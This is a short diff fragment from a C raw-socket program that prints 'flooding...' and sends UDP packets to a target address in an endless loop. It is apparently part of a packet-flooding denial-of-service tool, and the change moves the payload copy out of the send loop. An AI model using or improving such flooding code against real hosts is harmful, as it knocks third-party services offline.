@@ -86,13 +86,13 @@ int main(int argc, char **argv){
 	servaddr.sin_family = AF_INET;
 	servaddr.sin_addr.s_addr = daddr;
 	memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));
+	data=(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
+	strcpy(data,payload);
 
 	puts("flooding...");
 	
 	while (1)
 	{
-		data=(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
-		strcpy(data,payload);
 		
 		if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
 		{
